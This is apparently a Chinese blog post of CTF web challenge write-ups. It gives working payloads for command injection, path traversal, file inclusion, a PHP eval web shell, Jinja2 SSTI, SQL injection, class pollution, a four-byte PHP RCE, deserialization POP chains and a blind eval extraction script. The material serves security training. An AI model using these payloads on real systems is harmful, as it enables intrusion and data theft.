---
title: "Q CTF2025 Web 题解汇总"
description: "Q CTF 2025 Web方向比赛WP，整理解题思路、关键利用点和赛后复盘记录。"
pubDate: "2026-05-01"
updatedDate: "2026-05-01"
tags: ["CTF", "Web安全", "WP"]
cover: auto
coverAlt: "Q CTF2025 Web 题解汇总 的文章封面"
draft: false
---
## git

```
githacker --url http://ctf.a1natas.com:21671/.git --output-folder git
```

先拿一下.git，

```
git cat-file -p b8890f612f9e361abca3b66c31ad8a689ee52bfa
```

然后读一下两个拉出来的内容获得flag

## ping

```
127.0.0.1; find / -name fl*
```

```
127.0.0.1;cat fl*
```

简单的ping，用通配符来匹配flag，flag被过滤

## http

```
User-Agent: ?CTFBrowser
```

```
GET /?welcome=to HTTP/1.1
```

```
POST /?welcome=to HTTP/1.1
Host: ctf.a1natas.com:27037
Cache-Control: max-age=0
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: ?CTFBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

the=?CTF
```

```
Cookie:wishu=happiness
```

```
Referer:?CTF
```

```
X-Forwarded-For:127.0.0.1
```

## php

利用php特性，传2025a，或者利用intval，传0x7E9或者03751

```
a=QNKCDZO&b=240610708&aa[]=1&bb[]=2&aaa=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&bbb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

## js

读一下game.js，base64解码

或者直接控制台

```
atob('ZmxhZ3syODgxODM1OC0zY2Q2LTQzYzktOTQzNC05NTQwYWFlZWYzM2J9')
```

## 路径穿越

随便试一下，反馈为/var/www/html/backpack/111 食材不存在

直接路径穿越

```
../../../../flag.txt
```

## 文件包含

```
?url=php://filter/resource=/flag
```

## 文件上传

传一个图片马，该题目会把jpg png gif 当作php解析

```
<?php @eval($_POST['cmd']);?>
```

## 正则表达式
```
if(preg_match('/^-(ctf|CTF)<\n>{5}[h-l]\d\d\W+@email\.com flag.\b$/', $_？) && strlen($_？) == 40)
```

```
-ctf<
>>>>>h11..........@email.com flaga
```

```
\QPlease%5C%20777give%2B.%20!me%3F%3C%3D-%3D%3E(.*)Flaggg0\E(?#111111111111111111111111111111111111111111111111121111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111)
```

```
.*(?#111111111111111111111111111111111111111111111111121111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111)
```

## SSTI

fenjing秒了

```
{% set c = config.__init__.__globals__.__builtins__.chr %}{% set os_str = c(111)+c(115) %}{% set cmd = c(108)+c(115)+c(32)+c(47) %}{{ config.__init__.__globals__.__builtins__.__import__(os_str).popen(cmd).read() }}
```

```
{%25+set+c+%3D+config.__init__.__globals__.__builtins__.chr+%25}+{%25+set+os_str+%3D+c(111)%2Bc(115)+%25}+{%25+set+cmd+%3D+c(108)%2Bc(115)%2Bc(32)%2Bc(47)+%25}+{{+config.__init__.__globals__.__builtins__.__import__(os_str).popen(cmd).read()+}}
```

```
{% set c = config.__init__.__globals__.__builtins__.chr %}{% set os_str = c(111)+c(115) %}{% set cmd = c(99)+c(97)+c(116)+c(32)+c(47)+c(102)+c(108)+c(97)+c(103) %}{{ config.__init__.__globals__.__builtins__.__import__(os_str).popen(cmd).read() }}
```

```
%7b%25%20%73%65%74%20%63%20%3d%20%63%6f%6e%66%69%67%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%63%68%72%20%25%7d%7b%25%20%73%65%74%20%6f%73%5f%73%74%72%20%3d%20%63%28%31%31%31%29%2b%63%28%31%31%35%29%20%25%7d%7b%25%20%73%65%74%20%63%6d%64%20%3d%20%63%28%39%39%29%2b%63%28%39%37%29%2b%63%28%31%31%36%29%2b%63%28%33%32%29%2b%63%28%34%37%29%2b%63%28%31%30%32%29%2b%63%28%31%30%38%29%2b%63%28%39%37%29%2b%63%28%31%30%33%29%20%25%7d%7b%7b%20%63%6f%6e%66%69%67%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%6f%73%5f%73%74%72%29%2e%70%6f%70%65%6e%28%63%6d%64%29%2e%72%65%61%64%28%29%20%7d%7d
```

## ezsql

看一下F12和ctrl+U了解信息，爆破，账号密码为admin:admin123

以id为注入点进行sql，

```
?id=-1' union select hex(group_concat(column_name)),2,3 from information_schema.columns where table_name=0x666c616773--+
```

```
?id=-1' union select group_concat(flag),2,3 from flags--+
```

## 对象污染

扫盘发现/src，获得源码，我们的需要使cat==dog，但是我们只能对instanse进行修改，但是我们可以进一步修

改对象调用链，因为源码中merge是对我们的输入递归调用的

```
{
    "__init__": {
        "__globals__": {
            "dog": "where is the flag?"
        }
    }
}
```

## ezphp

首先是非法参数名传参，使用中括号替代下划线，可用使中括号被转换为下划线，而后续不变，url编码成功绕过

后续原理使利用自定义变量和取反操作实现命令执行

```
$_=~payload;`$_`;
```

可知这是一个四字节rce，反引号执行系统命令，我们可以通过，>和*来实现缩短命令，具体知识可搜索四字节rce学习一下

```
?c1n%5By0.u%20g3t%2Bfl%26g%3F=$_=~%C1%9C%9E%8B;`$_`;
```

先传一个cat，然后使用*匹配cat，将后面的文件输出到=文件中

```
>cat          *>=
```

```
?c1n%5By0.u%20g3t%2Bfl%26g%3F=$_=~%D5%C1%C2;`$_`;
```

访问=文件获得flag

## 魔术大杂烩

一个简单的pop链一层一层去套就好了没有什么复杂的绕过

```
<?php 
class Wuhuarou{
    public $Wuhuarou;
}
class Fentiao{
    public $Fentiao;
    public $Hongshufentiao;
    
}
class Baicai{
    public $Baicai;
    
}
class Wanzi{
    public $Wanzi;
    
}
class Xianggu{
    public $Xianggu;
    public $Jinzhengu;

    public function __construct($Jinzhengu){
        $this -> Jinzhengu = $Jinzhengu; 
    }
    
}
class Huluobo{
    public $HuLuoBo;
    
}
$cmd = "system('cat /flag');";
$huluobo = new Huluobo;
$xianggu = new Xianggu($cmd);
$xianggu -> Xianggu = $huluobo ;
$wanzi = new Wanzi;
$wanzi -> Wanzi = $xianggu;
$baicai = new Baicai;
$baicai -> Baicai = $wanzi;
$fentiao = new Fentiao;
$fentiao -> Fentiao = $baicai;
$wuhuarou = new Wuhuarou;
$wuhuarou -> Wuhuarou = $fentiao;

echo urlencode(serialize($wuhuarou));

?>
```

## HERO

php反序列化

```
<?php 
class Wuhuarou{
    public $Wuhuarou;
}
class Fentiao{
    public $Fentiao;
    public $Hongshufentiao;
    
}
class Baicai{
    public $Baicai;
    
}
class Wanzi{
    public $Wanzi;
    
}
class Xianggu{
    public $Xianggu;
    public $Jinzhengu;

    public function __construct($Jinzhengu){
        $this -> Jinzhengu = $Jinzhengu; 
    }
    
}
class Huluobo{
    public $HuLuoBo;
    
}
$cmd = "system('cat /flag');";
$huluobo = new Huluobo;
$xianggu = new Xianggu($cmd);
$xianggu -> Xianggu = $huluobo ;
$wanzi = new Wanzi;
$wanzi -> Wanzi = $xianggu;
$baicai = new Baicai;
$baicai -> Baicai = $wanzi;
$fentiao = new Fentiao;
$fentiao -> Fentiao = $baicai;
$wuhuarou = new Wuhuarou;
$wuhuarou -> Wuhuarou = $fentiao;

echo urlencode(serialize($wuhuarou));

?>
```

利用passthru函数绕过system，使用.拼接命令

## 这是什么函数(week3)

审一下/src的源码，题目中doit端口存在一个eval代码执行，不过无回显，我们可以当成盲注

python```
import requests
import time

url = "http://ctf.a1natas.com:26688/doit"
flag = ""

while not flag.endswith('}'):
    low = 32
    high = 127
    while low <= high:
        mid = (low + high) // 2
        payload = f'1/(ord(open("/flag").read()[{len(flag)}]) > {mid})'
        data = {'e': payload}
        response = requests.post(url, data=data)
        if "done!" in response.text:
            low = mid + 1
        else:
            high = mid - 1
    if low > 31 and low < 127:
        found_char = chr(low)
        flag += found_char
        print(f"[+] 成功找到新字符: {flag}")
    else:
        print(f"[!] 二分搜索在范围 [{low}, {high}] 内未能定位到有效字符，可能已到Flag末尾或出现错误，程序退出。")
        break
print(f"\n[+] 爆破完成！最终 Flag 是: {flag}")
```
